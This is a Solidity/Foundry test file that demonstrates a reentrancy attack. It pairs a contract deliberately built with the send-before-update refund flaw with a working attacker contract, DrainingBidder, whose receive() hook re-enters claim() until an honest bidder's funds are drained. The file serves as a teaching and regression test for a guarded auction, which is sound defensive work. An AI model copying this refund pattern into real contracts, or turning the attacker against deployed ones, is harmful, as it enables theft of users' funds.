// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";

/// @notice DELIBERATELY VULNERABLE. For the reentrancy demo only; never deploy.
///         Same pull-refund idea as DutchAuction.claim(), with both protections removed:
///         no nonReentrant guard, and the ETH is sent BEFORE the commitment is cleared.
contract VulnerableRefunds {
    mapping(address => uint256) public commitments;

    function bid() external payable {
        commitments[msg.sender] += msg.value;
    }

    function claim() external {
        uint256 amount = commitments[msg.sender];
        require(amount > 0, "nothing to claim");
        (bool ok,) = payable(msg.sender).call{value: amount}(""); // interaction first (bug)
        require(ok, "transfer failed");
        commitments[msg.sender] = 0; // effect last (bug): too late, re-entry already happened
    }
}

/// @notice A malicious bidder: every refund it receives triggers another claim(), until the
///         victim no longer holds a full refund's worth of ETH.
contract DrainingBidder {
    VulnerableRefunds public immutable victim;
    uint256 public reentries;

    constructor(VulnerableRefunds victim_) {
        victim = victim_;
    }

    function placeBid() external payable {
        victim.bid{value: msg.value}();
    }

    function attack() external {
        victim.claim();
    }

    receive() external payable {
        if (address(victim).balance >= victim.commitments(address(this))) {
            reentries++;
            victim.claim();
        }
    }
}

/// @notice Spec R7, the "before" half: the attack that Reentrancy.t.sol shows DutchAuction blocks
///         succeeds against a contract without the guard and checks-effects-interactions.
contract ReentrancyVulnerableTest is Test {
    VulnerableRefunds victim;
    address alice = makeAddr("alice");

    function setUp() public {
        victim = new VulnerableRefunds();
        vm.deal(alice, 5 ether);
    }

    function test_ReentrantClaimDrainsVulnerableContract() public {
        DrainingBidder attacker = new DrainingBidder(victim);

        // Alice, an honest bidder, has 5 ETH in the contract; the attacker puts in only 1 ETH.
        vm.prank(alice);
        victim.bid{value: 5 ether}();
        attacker.placeBid{value: 1 ether}();
        assertEq(address(victim).balance, 6 ether);

        attacker.attack();

        // The attacker was paid 6 times for a 1 ETH commitment and took Alice's money too.
        assertEq(attacker.reentries(), 5);
        assertEq(address(attacker).balance, 6 ether);
        assertEq(address(victim).balance, 0);

        // Alice is still owed 5 ETH, but the contract is empty, so her claim fails.
        assertEq(victim.commitments(alice), 5 ether);
        vm.prank(alice);
        vm.expectRevert(bytes("transfer failed"));
        victim.claim();
    }
}
